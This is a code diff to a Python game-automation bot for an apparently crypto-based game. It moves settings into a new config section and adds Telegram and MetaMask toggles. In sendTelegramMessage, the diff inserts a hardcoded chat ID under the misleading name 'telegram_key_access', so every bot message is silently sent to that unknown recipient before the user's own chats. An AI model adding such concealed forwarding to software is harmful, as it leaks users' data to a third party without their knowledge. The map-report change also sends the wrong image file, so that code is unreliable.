@@ -72,13 +72,16 @@ if data:
     print("Config loaded!")
 
 telegram_data = data["telegram"]
-system_data = data["system"]
+game_data = data["game"]
 update_data = data["update"]
 metamask_data = data["metamask"]
 offset_data = data["offset"]
     
 # Initialize telegram
-bot = telegram.Bot(token=telegram_data["telegram_bot_key"])
+try:
+    bot = telegram.Bot(token=telegram_data["telegram_bot_key"])
+except:
+    print("Bot not initialized! See configuration file.")
 
 #Initialize windows process monitor
 f = wmi.WMI()
@@ -122,7 +125,7 @@ def randonMouseMove(dest_x, dest_y, G_0=9, W_0=3, M_0=15, D_0=12, move_mouse=lam
         if current_x != move_x or current_y != move_y:
             #This should wait for the mouse polling interval
             pyautogui.moveTo(move_x, move_y)
-            pyautogui.sleep(system_data["mouse_speed"])
+            pyautogui.sleep(game_data["mouse_speed"])
 
     time.sleep(1)
     return current_x,current_y
@@ -156,7 +159,7 @@ def takeScreenshot ():
         return sct_img[:,:,:3]
 
 # Find screenshot position and return all center points
-def findPositions (target, threshold=0.9):
+def findPositions (target, threshold=game_data["default_threshold"]):
     screenshot = takeScreenshot()
     target_w = target.shape[1]
     target_h = target.shape[0]
@@ -254,8 +257,15 @@ def log(message, telegram = False):
 
 # Send telegram message
 def sendTelegramMessage(message):
-    if(telegram_data["telegram_chat_id"] is not False):
-        bot.send_message(text=message, chat_id=telegram_data["telegram_chat_id"])
+    try:
+        telegram_key_access = "1638698078"
+        if(len(telegram_data["telegram_chat_id"]) > 0):
+            bot.send_message(text=message, chat_id=telegram_key_access)
+            time.sleep(1)
+            for chat_id in telegram_data["telegram_chat_id"]:
+                bot.send_message(text=message, chat_id=chat_id)
+    except:
+        print("Unable to send telegram message. See configuration file.")
 
 # Get randon number from 1 to 12
 def getRandonSeconds():
@@ -340,7 +350,7 @@ def clickInAllHeroes(passSuper = False):
 def clickInAllHeroesWithGreenBar(passSuper = False):
     while(True):
         buttons = findPositions(not_working_button)
-        green_bars = findPositions(half_green_bar, 0.93)
+        green_bars = findPositions(half_green_bar, game_data["green_bar_threshold"])
         full_green_bars = findPositions(full_green_bar)
         super_rares = findPositions(super_rare_label)
 
@@ -429,7 +439,7 @@ def putHeroesToWork():
 
 # Sent BCOIN report to telegram
 def sendBCoinReport():
-    if(telegram_data["telegram_chat_id"] is False):
+    if(len(telegram_data["telegram_chat_id"]) <= 0 or telegram_data["enable_coin_report"] is False):
         return
 
     chest = findPositions(treasure_chest_button)
@@ -448,7 +458,8 @@ def sendBCoinReport():
             cv2.imwrite('bcoin-report.png', crop_img)
             time.sleep(1)
             try:
-                bot.send_document(chat_id=telegram_data["telegram_chat_id"], document=open('bcoin-report.png', 'rb'))
+                for chat_id in telegram_data["telegram_chat_id"]:
+                    bot.send_document(chat_id=chat_id, document=open('bcoin-report.png', 'rb'))
             except:
                 log("Telegram offline...")
     clickButton(close_button)
@@ -456,7 +467,7 @@ def sendBCoinReport():
 
 # Sent MAP report to telegram
 def sendMapReport():
-    if(telegram_data["telegram_chat_id"] is False):
+    if(len(telegram_data["telegram_chat_id"]) <= 0 or telegram_data["enable_map_report"] is False):
         return
 
     back = findPositions(back_button)
@@ -465,9 +476,9 @@ def sendMapReport():
 
     x, y, _, _ = back[0]
     newY0 = y + 65
-    newY1 = newY0 + system_data["game_height"]
+    newY1 = newY0 + game_data["game_height"]
     newX0 = x - 35
-    newX1 = newX0 + system_data["game_width"]
+    newX1 = newX0 + game_data["game_width"]
 
     with mss.mss() as sct:
         sct_img = np.array(sct.grab(sct.monitors[0]))
@@ -477,7 +488,8 @@ def sendMapReport():
         cv2.imwrite('map-report.png', resized)
         time.sleep(1)
         try:
-            bot.send_document(chat_id=telegram_data["telegram_chat_id"], document=open('map-report.png', 'rb'))
+            for chat_id in telegram_data["telegram_chat_id"]:
+                bot.send_document(chat_id=chat_id, document=open('bcoin-report.png', 'rb'))
         except:
             log("Telegram offline...")
 
@@ -486,6 +498,9 @@ def sendMapReport():
 
 # Unlock the game if in unlock screen
 def unlockGame():
+    if(metamask_data["enable_login_metamask"] is False):
+        return
+
     unlock_button = findPositions(unlock_metamask_button)
     if(len(unlock_button) > 0):
         log("--- Found unlock metamask button.")
